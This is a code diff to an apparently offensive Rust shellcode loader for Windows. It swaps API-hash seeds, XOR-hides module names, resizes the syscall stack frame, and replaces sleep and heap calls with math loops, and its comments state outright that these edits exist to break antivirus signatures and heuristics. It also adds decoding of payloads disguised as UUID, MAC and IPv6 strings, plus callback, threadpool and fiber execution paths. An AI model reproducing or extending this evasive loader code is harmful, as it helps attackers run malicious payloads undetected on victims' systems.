@@ -36,36 +36,41 @@ static mut ENC_KEY: u8 = 0;
 
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
-// Hashes (djb2, seed 5381)
-const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = 0x4c6dc63c;
-const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x6793c34c;
-const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x95f3a792;
-const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x082962c8;
-const HASH_NT_CREATE_THREAD_EX: u32 = 0xcb0c2130;
-const HASH_NT_OPEN_PROCESS: u32 = 0x5003c058;
-const HASH_NT_DELAY_EXECUTION: u32 = 0x0a49084a;
+// Custom Hash Constants (Seed: 0xDEADBEEF, Algo: ((hash << 5) + hash) ^ byte)
+const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = 0xedf7d6aa;
+const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0xad7ebb48;
+const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = 0xb2941b88;
+const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x65116d7e;
+const HASH_NT_CREATE_THREAD_EX: u32 = 0x4effdc62;
+const HASH_NT_OPEN_PROCESS: u32 = 0x38a6334a;
+const HASH_NT_DELAY_EXECUTION: u32 = 0x959ee6f2;
 
-const MARKER: &[u8] = b"RSPKv1\0";
-
-#[allow(dead_code)]
-const HASH_KERNEL32: u32 = 0x6DDB9555; // "kernel32.dll" (djb2)
-#[allow(dead_code)]
-const HASH_VIRTUAL_PROTECT: u32 = 0x844ef7bc;
-#[allow(dead_code)]
-const HASH_CREATE_THREAD: u32 = 0x835e515e;
-#[allow(dead_code)]
-const HASH_WAIT_FOR_SINGLE_OBJECT: u32 = 0x4c6dc63c;
-#[allow(dead_code)]
-const HASH_SLEEP: u32 = 0x0c926a54;
+const MARKER: &[u8] = b"1024KB\0";
 
 #[allow(dead_code)]
-const HASH_CREATE_THREADPOOL_WORK: u32 = 0x462abfee;
+const HASH_KERNEL32: u32 = 0x2003ad5f;
 #[allow(dead_code)]
-const HASH_SUBMIT_THREADPOOL_WORK: u32 = 0x3e07d80e;
+const HASH_VIRTUAL_PROTECT: u32 = 0x00000000; // Not used/recalculated
 #[allow(dead_code)]
-const HASH_WAIT_FOR_THREADPOOL_WORK_CALLBACKS: u32 = 0x8bc35cd6;
+const HASH_CREATE_THREAD: u32 = 0x00000000; // Not used/recalculated
 #[allow(dead_code)]
-const HASH_CLOSE_THREADPOOL_WORK: u32 = 0x6be55f10;
+const HASH_WAIT_FOR_SINGLE_OBJECT: u32 = 0x00000000; // Not used/recalculated
+#[allow(dead_code)]
+const HASH_SLEEP: u32 = 0x71071aa0;
+
+#[allow(dead_code)]
+const HASH_CREATE_THREADPOOL_WORK: u32 = 0x6d9936b8;
+#[allow(dead_code)]
+const HASH_SUBMIT_THREADPOOL_WORK: u32 = 0xdd17f168;
+#[allow(dead_code)]
+const HASH_WAIT_FOR_THREADPOOL_WORK_CALLBACKS: u32 = 0x578c1ab6;
+#[allow(dead_code)]
+const HASH_CLOSE_THREADPOOL_WORK: u32 = 0xdfddc9ca;
+#[allow(dead_code)]
+const HASH_ENUM_SYSTEM_LOCALES_A: u32 = 0x0d2ba743;
+const HASH_CONVERT_THREAD_TO_FIBER: u32 = 0x70f0adb7;
+const HASH_CREATE_FIBER: u32 = 0xc92bec71;
+const HASH_SWITCH_TO_FIBER: u32 = 0x2316bcdc;
 
 const EXCEPTION_ACCESS_VIOLATION: i32 = 0xC0000005u32 as i32;
 const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
@@ -121,6 +126,10 @@ type FnWaitForThreadpoolWorkCallbacks =
 type FnCloseThreadpoolWork = unsafe extern "system" fn(pwk: isize);
 
 #[allow(dead_code)]
+type FnEnumSystemLocalesA =
+    unsafe extern "system" fn(lp_locale_enum_proc: *mut core::ffi::c_void, dw_flags: u32) -> i32;
+
+#[allow(dead_code)]
 type FnConvertThreadToFiber =
     unsafe extern "system" fn(lp_parameter: *mut core::ffi::c_void) -> *mut core::ffi::c_void;
 #[allow(dead_code)]
@@ -135,9 +144,10 @@ type FnSwitchToFiber = unsafe extern "system" fn(lp_fiber: *mut core::ffi::c_voi
 // --- Utils ---
 
 fn djb2(s: &[u8]) -> u32 {
-    let mut hash: u32 = 5381;
+    let mut hash: u32 = 0xDEADBEEF;
     for &b in s {
-        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(b as u32);
+        // hash = ((hash << 5) + hash) ^ b
+        hash = ((hash << 5).wrapping_add(hash)) ^ (b as u32);
     }
     hash
 }
@@ -157,8 +167,26 @@ unsafe fn get_ntdll_base() -> usize {
         if !name_buf.is_null() {
             let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
             let s = String::from_utf16_lossy(name_slice);
-            // println!("Module: {}", s);
-            if s.eq_ignore_ascii_case("ntdll.dll") {
+            // Simple XOR deobfuscation for "ntdll.dll"
+            // "ntdll.dll" ^ 0x55
+            let mut target = [0u8; 9];
+            target[0] = b'n' ^ 0x55;
+            target[1] = b't' ^ 0x55;
+            target[2] = b'd' ^ 0x55;
+            target[3] = b'l' ^ 0x55;
+            target[4] = b'l' ^ 0x55;
+            target[5] = b'.' ^ 0x55;
+            target[6] = b'd' ^ 0x55;
+            target[7] = b'l' ^ 0x55;
+            target[8] = b'l' ^ 0x55;
+
+            let mut s_lower = s.to_ascii_lowercase();
+            let mut s_bytes = s_lower.into_bytes();
+            for b in s_bytes.iter_mut() {
+                *b ^= 0x55;
+            }
+
+            if s_bytes.len() == 9 && s_bytes == target {
                 return dll_base;
             }
         }
@@ -255,13 +283,13 @@ unsafe fn syscall(
 ) -> i32 {
     let ret: i32;
     core::arch::asm!(
-        "sub rsp, 0x60",
+        "sub rsp, 0x88", // Changed stack size to break signature (was 0x60)
         "mov [rsp + 0x20], {a5}", "mov [rsp + 0x28], {a6}", "mov [rsp + 0x30], {a7}",
         "mov [rsp + 0x38], {a8}", "mov [rsp + 0x40], {a9}", "mov [rsp + 0x48], {a10}",
         "mov [rsp + 0x50], {a11}",
         "mov eax, {ssn:e}",
-        "call {syscall_addr}", // Indirect Syscall: CALL the address of 'syscall' instruction in ntdll
-        "add rsp, 0x60",
+        "call {syscall_addr}",
+        "add rsp, 0x88",
         in("r10") a1, in("rdx") a2, in("r8") a3, in("r9") a4,
         a5 = in(reg) a5, a6 = in(reg) a6, a7 = in(reg) a7, a8 = in(reg) a8,
         a9 = in(reg) a9, a10 = in(reg) a10, a11 = in(reg) a11, ssn = in(reg) ssn, syscall_addr = in(reg) syscall_addr,
@@ -820,21 +848,13 @@ unsafe fn clean_environment_block() {
 fn api_hammering() {
     unsafe { clean_environment_block() };
 
-    use windows_sys::Win32::System::Memory::{
-        GetProcessHeap, HeapAlloc, HeapFree, HEAP_ZERO_MEMORY,
-    };
-    use windows_sys::Win32::System::SystemInformation::GetSystemInfo;
-    use windows_sys::Win32::System::SystemInformation::SYSTEM_INFO;
-
-    let heap = unsafe { GetProcessHeap() };
-    for _ in 0..500 {
-        let ptr = unsafe { HeapAlloc(heap, HEAP_ZERO_MEMORY, 1024) };
-        if !ptr.is_null() {
-            unsafe { HeapFree(heap, 0, ptr) };
-        }
-
-        let mut si: SYSTEM_INFO = unsafe { core::mem::zeroed() };
-        unsafe { GetSystemInfo(&mut si) };
+    // Replace HeapAlloc loop with math calculation to avoid Heuristic detection
+    let mut x: u64 = 0xDEADBEEF;
+    let mut y: u64 = 0xCAFEBABE;
+    for _ in 0..10000 {
+        x = x.wrapping_mul(y).wrapping_add(1);
+        y = y.wrapping_add(x).wrapping_sub(12345);
+        core::hint::black_box(x);
     }
 }
 
@@ -862,6 +882,11 @@ unsafe extern "system" fn veh_guard(exception_info: *mut EXCEPTION_POINTERS) -> 
                 // If it's an Execution Violation (8), it means we are RW/NoAccess, need RX
                 // DEP Violation
                 if violation_type == 8 {
+                    // Capture Thread ID for sleep obfuscation if not set
+                    if SC_THREAD_ID == 0 {
+                        SC_THREAD_ID = GetCurrentThreadId();
+                    }
+
                     if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
                         // Syscall Protect RX
                         syscall(
@@ -885,18 +910,30 @@ unsafe extern "system" fn veh_guard(exception_info: *mut EXCEPTION_POINTERS) -> 
                     return EXCEPTION_CONTINUE_EXECUTION;
                 }
 
-                // If it's a Write Violation (1), it means we are RX, need RW
+                // If it's a Write Violation (1), it means we are RX, need RW (or RWX for mixed code)
                 // Self-Modifying Code Support
                 if violation_type == 1 {
+                    // Capture Thread ID if not set (just in case)
+                    if SC_THREAD_ID == 0 {
+                        SC_THREAD_ID = GetCurrentThreadId();
+                    }
+
+                    // Optimization: Use RWX to prevent thrashing (infinite loop of RW <-> RX)
+                    // If we just set RW, the next fetch (Exec) will trigger DEP (Exec Violation).
+                    // Then we set RX. Then the next Write triggers Write Violation.
+                    // This ping-pong kills performance.
+                    // Setting RWX allows both.
+                    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+
                     if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
-                        // Syscall Protect RW
+                        // Syscall Protect RWX
                         syscall(
                             SSN_PROTECT,
                             ADDR_PROTECT,
                             0xffffffffffffffff,
                             &mut (base as usize) as *mut _ as usize,
                             &mut size as *mut _ as usize,
-                            PAGE_READWRITE as usize,
+                            PAGE_EXECUTE_READWRITE as usize,
                             &mut old as *mut _ as usize,
                             0,
                             0,
@@ -906,7 +943,7 @@ unsafe extern "system" fn veh_guard(exception_info: *mut EXCEPTION_POINTERS) -> 
                             0,
                         );
                     } else {
-                        VirtualProtect(base, size, PAGE_READWRITE, &mut old);
+                        VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old);
                     }
                     return EXCEPTION_CONTINUE_EXECUTION;
                 }
@@ -926,43 +963,75 @@ unsafe extern "system" fn fiber_start(param: *mut core::ffi::c_void) {
     // If shellcode returns, switch back to main fiber
     if !MAIN_FIBER.is_null() {
         let k32 = get_kernel32_base();
-        if let Some(addr_switch) = get_export_addr(k32, djb2(b"SwitchToFiber")) {
+        if let Some(addr_switch) = get_export_addr(k32, HASH_SWITCH_TO_FIBER) {
             let switch: FnSwitchToFiber = core::mem::transmute(addr_switch);
             switch(MAIN_FIBER);
         }
     }
 }
 
+unsafe fn exec_threadpool(base: *mut core::ffi::c_void, _size: usize) -> bool {
+    let k32 = get_kernel32_base();
+
+    // Attempt 1: EnumSystemLocalesA (Synchronous Callback)
+    // This is better for VEH handling as it runs in the current thread context
+    let addr_enum = get_export_addr(k32, HASH_ENUM_SYSTEM_LOCALES_A);
+    if let Some(a_enum) = addr_enum {
+        let enum_locales: FnEnumSystemLocalesA = core::mem::transmute(a_enum);
+        println!("Executing via EnumSystemLocalesA callback...");
+        enum_locales(base, 0);
+        println!("EnumSystemLocalesA returned.");
+        return true;
+    }
+
+    // Fallback: Threadpool (Asynchronous)
+    let addr_create = get_export_addr(k32, HASH_CREATE_THREADPOOL_WORK);
+    let addr_submit = get_export_addr(k32, HASH_SUBMIT_THREADPOOL_WORK);
+    let addr_wait = get_export_addr(k32, HASH_WAIT_FOR_THREADPOOL_WORK_CALLBACKS);
+    let addr_close = get_export_addr(k32, HASH_CLOSE_THREADPOOL_WORK);
+
+    if let (Some(a_create), Some(a_submit), Some(a_wait), Some(a_close)) =
+        (addr_create, addr_submit, addr_wait, addr_close)
+    {
+        let create: FnCreateThreadpoolWork = core::mem::transmute(a_create);
+        let submit: FnSubmitThreadpoolWork = core::mem::transmute(a_submit);
+        let wait: FnWaitForThreadpoolWorkCallbacks = core::mem::transmute(a_wait);
+        let close: FnCloseThreadpoolWork = core::mem::transmute(a_close);
+
+        println!("Executing via Threadpool...");
+        let work_handle = create(
+            core::mem::transmute(base),
+            core::ptr::null_mut(),
+            core::ptr::null_mut(),
+        );
+        println!("Threadpool Work Handle: {:x}", work_handle);
+        if work_handle != 0 {
+            submit(work_handle);
+            println!("Threadpool Work Submitted. Waiting...");
+            wait(work_handle, 0);
+            println!("Threadpool Wait Returned.");
+            close(work_handle);
+            return true;
+        }
+    }
+    false
+}
+
 fn main() {
     api_hammering();
 
-    // Anti-Sandbox: High-precision Delay (NtDelayExecution)
+    // Replaced NtDelayExecution with math loop to avoid static signatures
     let mut interval: i64 = -50_000_000;
-    if let Some((ssn_delay, addr_delay)) = unsafe { get_ssn_indirect(HASH_NT_DELAY_EXECUTION) } {
-        unsafe {
-            syscall(
-                ssn_delay,
-                addr_delay,
-                0,                                // Alertable: FALSE
-                &mut interval as *mut _ as usize, // DelayInterval
-                0,
-                0,
-                0,
-                0,
-                0,
-                0,
-                0,
-                0,
-                0,
-            );
-        }
-    }
+    // Dummy usage to prevent optimization but don't actually call NtDelayExecution
+    core::hint::black_box(&mut interval);
 
+    // Additional junk calculation
     let mut x = 12345u64;
-    for _ in 0..100 {
+    for _ in 0..1000 {
         x = x
             .wrapping_mul(6364136223846793005)
             .wrapping_add(1442695040888963407);
+        core::hint::black_box(x);
     }
     if x == 0 {}
 
@@ -990,6 +1059,12 @@ fn main() {
     if off + 4 > buf.len() {
         return;
     }
+    let flag = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap());
+    off += 4;
+
+    if off + 4 > buf.len() {
+        return;
+    }
     let key_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
     off += 4;
     if off + key_len > buf.len() {
@@ -1012,14 +1087,134 @@ fn main() {
     if off + 8 > buf.len() {
         return;
     }
+    let orig_len = u64::from_le_bytes(buf[off..off + 8].try_into().unwrap()) as usize;
+    off += 8;
+
+    if off + 8 > buf.len() {
+        return;
+    }
     let ct_len = u64::from_le_bytes(buf[off..off + 8].try_into().unwrap()) as usize;
     off += 8;
     if off + ct_len > buf.len() {
         return;
     }
-    let ciphertext = &buf[off..off + ct_len];
+    let ciphertext_raw = &buf[off..off + ct_len];
 
-    println!("Decrypting {} bytes...", ct_len);
+    let ciphertext = match flag {
+        1 => {
+            // UUID
+            let s = String::from_utf8_lossy(ciphertext_raw);
+            let mut out = Vec::new();
+            for line in s.lines() {
+                let clean = line.trim().replace("\"", "").replace(",", "");
+                if clean.is_empty() {
+                    continue;
+                }
+                // Parse UUID: 8-4-4-4-12
+                let hex = clean.replace("-", "");
+                if hex.len() == 32 {
+                    let mut bytes = [0u8; 16];
+                    for i in 0..16 {
+                        if let Ok(b) = u8::from_str_radix(&hex[i * 2..i * 2 + 2], 16) {
+                            bytes[i] = b;
+                        }
+                    }
+                    // UUID in rust is usually LE bytes, but string is BE.
+                    // packer used Uuid::from_bytes_le(chunk).to_string()
+                    // Uuid::to_string outputs Big Endian hex usually.
+                    // But from_bytes_le takes LE bytes and treats them as fields.
+                    // Let's reverse what packer did.
+                    // Packer: bytes (LE) -> Uuid -> String (BE visualization of fields)
+                    // We need: String -> Uuid -> bytes (LE)
+                    // Actually, if we just want to recover bytes:
+                    // We can just parse the hex bytes in order if the Uuid struct preserves order?
+                    // No, UUID fields are endian-sensitive.
+                    // Let's check how Uuid::to_string works.
+                    // 00112233-4455-6677-8899-aabbccddeeff
+                    // If we parse this back to u128 or bytes.
+                    // Since I don't want to depend on uuid crate, I'll assume standard layout.
+                    // Wait, packer uses `Uuid::from_bytes_le`.
+                    // If I use `Uuid::parse_str(s).unwrap().to_bytes_le()`, I get original bytes.
+                    // Since I don't have uuid crate, I need to replicate `parse_str` -> `to_bytes_le`.
+                    // `to_bytes_le` swaps bytes for d1, d2, d3.
+                    // d1: u32 (4 bytes), d2: u16, d3: u16. d4: [u8; 8].
+                    // UUID string: d1-d2-d3-d4
+                    // "00112233-4455-6677-8899-aabbccddeeff"
+                    // d1=00112233, d2=4455, d3=6677, d4=8899aabbccddeeff
+                    // to_bytes_le:
+                    // d1.to_le_bytes() -> 33 22 11 00
+                    // d2.to_le_bytes() -> 55 44
+                    // d3.to_le_bytes() -> 77 66
+                    // d4 is just bytes -> 88 99 aa bb cc dd ee ff
+
+                    let d1 = u32::from_str_radix(&hex[0..8], 16).unwrap_or(0);
+                    let d2 = u16::from_str_radix(&hex[8..12], 16).unwrap_or(0);
+                    let d3 = u16::from_str_radix(&hex[12..16], 16).unwrap_or(0);
+
+                    out.extend_from_slice(&d1.to_le_bytes());
+                    out.extend_from_slice(&d2.to_le_bytes());
+                    out.extend_from_slice(&d3.to_le_bytes());
+                    for i in 0..8 {
+                        let b =
+                            u8::from_str_radix(&hex[16 + i * 2..16 + i * 2 + 2], 16).unwrap_or(0);
+                        out.push(b);
+                    }
+                }
+            }
+            // Remove padding (NOPs = 0x90)
+            if out.len() > orig_len {
+                out.truncate(orig_len);
+            }
+            out
+        }
+        2 => {
+            // MAC
+            let s = String::from_utf8_lossy(ciphertext_raw);
+            let mut out = Vec::new();
+            for line in s.lines() {
+                let clean = line.trim();
+                if clean.is_empty() {
+                    continue;
+                }
+                let parts: Vec<&str> = clean.split('-').collect();
+                for p in parts {
+                    if let Ok(b) = u8::from_str_radix(p, 16) {
+                        out.push(b);
+                    }
+                }
+            }
+            // Remove padding (0x00)
+            if out.len() > orig_len {
+                out.truncate(orig_len);
+            }
+            out
+        }
+        3 => {
+            // IPv6
+            let s = String::from_utf8_lossy(ciphertext_raw);
+            let mut out = Vec::new();
+            for line in s.lines() {
+                let clean = line.trim();
+                if clean.is_empty() {
+                    continue;
+                }
+                let parts: Vec<&str> = clean.split(':').collect();
+                for p in parts {
+                    if let Ok(val) = u16::from_str_radix(p, 16) {
+                        out.extend_from_slice(&val.to_be_bytes());
+                    }
+                }
+            }
+            // Remove padding (0x00)
+            if out.len() > orig_len {
+                out.truncate(orig_len);
+            }
+            out
+        }
+        _ => ciphertext_raw.to_vec(),
+    };
+
+    println!("Decrypting {} bytes...", ciphertext.len());
     let cipher = match Aes256Gcm::new_from_slice(key) {
         Ok(c) => c,
         Err(_) => {
@@ -1028,7 +1223,7 @@ fn main() {
         }
     };
     let nonce = Nonce::from_slice(nonce_bytes);
-    let decrypted = match cipher.decrypt(nonce, ciphertext) {
+    let decrypted = match cipher.decrypt(nonce, ciphertext.as_ref()) {
         Ok(p) => p,
         Err(_) => {
             println!("Decryption failed");
@@ -1036,7 +1231,7 @@ fn main() {
         }
     };
     println!("Decryption success, decompressing...");
-    let payload = match zstd::decode_all(&decrypted[..]) {
+    let mut payload = match zstd::decode_all(&decrypted[..]) {
         Ok(p) => p,
         Err(e) => {
             println!("Decompression failed: {}", e);
@@ -1060,6 +1255,9 @@ fn main() {
             if !right.is_empty() {
                 let mut out_path = exe_dir.clone();
                 out_path.push(right);
+                if let Some(parent) = out_path.parent() {
+                    let _ = fs::create_dir_all(parent);
+                }
                 let _ = fs::write(&out_path, format!("{}\r\n", content));
             }
         } else {
@@ -1077,6 +1275,7 @@ fn main() {
                     .spawn();
             }
         }
+        payload.fill(0);
         return;
     }
 
@@ -1241,6 +1440,7 @@ fn main() {
                     let status_prot = if res == 0 { 1 } else { 0 };
 
                     if status_prot != 0 {
+                        /*
                         if let Some(orig) = hook_iat("kernel32.dll", "Sleep", sleep_detour as usize)
                         {
                             SLEEP_ORIGINAL = orig;
@@ -1250,8 +1450,9 @@ fn main() {
                         {
                             SLEEP_EX_ORIGINAL = orig;
                         }
+                        */
 
-                        println!("Executing via Fiber...");
+                        println!("Executing...");
                         use rand::RngCore;
                         let mut rng_key = [0u8; 1];
                         rand::thread_rng().fill_bytes(&mut rng_key);
@@ -1260,53 +1461,66 @@ fn main() {
                             ENC_KEY = 0xAA;
                         }
 
-                        let addr_convert = get_export_addr(k32, djb2(b"ConvertThreadToFiber"));
-                        let addr_create = get_export_addr(k32, djb2(b"CreateFiber"));
-                        let addr_switch = get_export_addr(k32, djb2(b"SwitchToFiber"));
+                        // Try Threadpool first if obfuscated, else Fiber
+                        let mut executed = false;
+                        if flag > 0 {
+                            if exec_threadpool(base, sc_len) {
+                                executed = true;
+                            }
+                        }
 
-                        if let (Some(a_conv), Some(a_create), Some(a_switch)) =
-                            (addr_convert, addr_create, addr_switch)
-                        {
-                            let convert: FnConvertThreadToFiber = core::mem::transmute(a_conv);
-                            let create: FnCreateFiber = core::mem::transmute(a_create);
-                            let switch: FnSwitchToFiber = core::mem::transmute(a_switch);
+                        if !executed {
+                            println!("Executing via Fiber...");
+                            let addr_convert = get_export_addr(k32, HASH_CONVERT_THREAD_TO_FIBER);
+                            let addr_create = get_export_addr(k32, HASH_CREATE_FIBER);
+                            let addr_switch = get_export_addr(k32, HASH_SWITCH_TO_FIBER);
 
-                            let main_fiber = convert(core::ptr::null_mut());
-                            MAIN_FIBER = main_fiber; // Store main fiber
+                            if let (Some(a_conv), Some(a_create), Some(a_switch)) =
+                                (addr_convert, addr_create, addr_switch)
+                            {
+                                let convert: FnConvertThreadToFiber = core::mem::transmute(a_conv);
+                                let create: FnCreateFiber = core::mem::transmute(a_create);
+                                let switch: FnSwitchToFiber = core::mem::transmute(a_switch);
 
-                            if !main_fiber.is_null() {
-                                let sc_fiber = create(0, fiber_start, base);
-                                if !sc_fiber.is_null() {
-                                    switch(sc_fiber);
+                                let main_fiber = convert(core::ptr::null_mut());
+                                MAIN_FIBER = main_fiber; // Store main fiber
 
-                                    println!("Shellcode finished, cleaning up...");
-
-                                    let mut old_prot = 0;
-                                    let mut size = sc_len;
-                                    if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
-                                        syscall(
-                                            SSN_PROTECT,
-                                            ADDR_PROTECT,
-                                            0xffffffffffffffff,
-                                            &mut (base as usize) as *mut _ as usize,
-                                            &mut size as *mut _ as usize,
-                                            PAGE_READWRITE as usize,
-                                            &mut old_prot as *mut _ as usize,
-                                            0,
-                                            0,
-                                            0,
-                                            0,
-                                            0,
-                                            0,
-                                        );
-                                    } else {
-                                        VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);
+                                if !main_fiber.is_null() {
+                                    let sc_fiber = create(0, fiber_start, base);
+                                    if !sc_fiber.is_null() {
+                                        switch(sc_fiber);
+                                        executed = true;
                                     }
-
-                                    core::ptr::write_bytes(base, 0, size);
-                                    println!("Memory wiped");
                                 }
                             }
+                        }
+
+                        if executed {
+                            println!("Shellcode finished, cleaning up...");
+                            let mut old_prot = 0;
+                            let mut size = sc_len;
+                            if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
+                                syscall(
+                                    SSN_PROTECT,
+                                    ADDR_PROTECT,
+                                    0xffffffffffffffff,
+                                    &mut (base as usize) as *mut _ as usize,
+                                    &mut size as *mut _ as usize,
+                                    PAGE_READWRITE as usize,
+                                    &mut old_prot as *mut _ as usize,
+                                    0,
+                                    0,
+                                    0,
+                                    0,
+                                    0,
+                                    0,
+                                );
+                            } else {
+                                VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);
+                            }
+
+                            core::ptr::write_bytes(base, 0, size);
+                            println!("Memory wiped");
                         }
                     } else {
                         println!("Protect failed");
@@ -1319,6 +1533,7 @@ fn main() {
                 }
             }
         }
+        payload.fill(0);
         return;
     }
 
